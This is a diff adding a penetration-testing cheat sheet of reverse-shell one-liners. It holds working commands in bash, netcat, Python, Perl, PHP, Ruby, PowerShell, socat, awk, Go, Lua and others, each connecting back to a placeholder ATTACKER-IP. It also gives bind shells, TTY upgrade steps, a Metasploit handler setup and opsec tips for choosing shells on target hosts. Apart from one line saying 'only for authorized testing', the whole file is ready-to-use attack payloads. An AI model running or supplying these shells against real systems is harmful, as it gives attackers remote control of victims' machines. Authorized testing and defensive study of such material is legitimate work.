@@ -1,0 +1,85 @@
+# Reverse Shell One-Liners
+# Replace ATTACKER-IP and PORT (4444). URL-encode if used in URLs.
+
+## BASH
+bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
+0<&196;exec 196<>/dev/tcp/ATTACKER-IP/4444; bash <&196 >&196 2>&196
+bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
+exec 5<>/dev/tcp/ATTACKER-IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+## NETCAT (classic)
+nc -e /bin/sh ATTACKER-IP 4444
+nc -e /bin/bash ATTACKER-IP 4444
+nc -c bash ATTACKER-IP 4444
+/bin/nc.evil -e /bin/sh ATTACKER-IP 4444
+
+## PYTHON
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+## PERL
+perl -e 'use Socket;$i="ATTACKER-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER-IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+## PHP
+php -r '$sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER-IP",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER-IP",4444);$proc=proc_open("/bin/sh",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);echo stream_get_contents($pipes[1]);'
+<?php system('bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'); ?>
+
+## RUBY
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER-IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e's=TCPSocket.new("ATTACKER-IP",4444); loop{cmd=s.gets.chomp; IO.popen(cmd,"r"){|io| s.print io.read}}'
+
+## POWERSHELL (Windows)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -e <base64-encoded-command>
+# Encode:
+# $ ip="ATTACKER-IP";$p=4444;$c=New-Object Net.Sockets.TCPClient($ip,$p);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$x=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes("PS> "+$x),0,$x.Length+4);$c.Close()}
+# then: powershell -enc <b64>
+
+## SOCAT
+socat TCP:ATTACKER-IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+socat TCP:ATTACKER-IP:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
+
+## AWK
+awk 'BEGIN {s="/inet/tcp/0/ATTACKER-IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c | getline) > 0) print $0 |& s; close(c) } } while(c!="exit") close(s) }}' /dev/null
+
+## TELNET (obscure but works)
+telnet ATTACKER-IP 4444 | /bin/bash | telnet ATTACKER-IP 5555
+# listener1: nc -lnvp 4444 ; listener2: nc -lnvp 5555
+
+## JAVA
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER-IP/4444;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+## GO
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER-IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go
+
+## LUA
+lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('ATTACKER-IP',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);f:close();end;t:close();"
+
+## BIND SHELLS (target opens port)
+nc -lnvp 4444 -e /bin/bash                 # linux netcat
+nc -lnvp 4444 -e cmd.exe                   # windows netcat
+nc -nv 4444 -e /bin/sh
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+## UPGRADE TO TTY (post-shell quality)
+python -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z  →  stty raw -echo  →  fg  →  export TERM=xterm
+# Or script: /usr/bin/script -qc /bin/bash /dev/null
+
+## MSF multi handler quick
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST ATTACKER-IP
+set LPORT 4444
+run
+# windows: windows/x64/shell_reverse_tcp
+
+## OPSEC NOTE (only for authorized testing)
+- Prefer TCP shells to interactive nc on modern hosts.
+- If the target has no nc/socat, python/perl are your best bet (often present).
+- For Windows targets, the PowerShell one-liner is the standard answer.
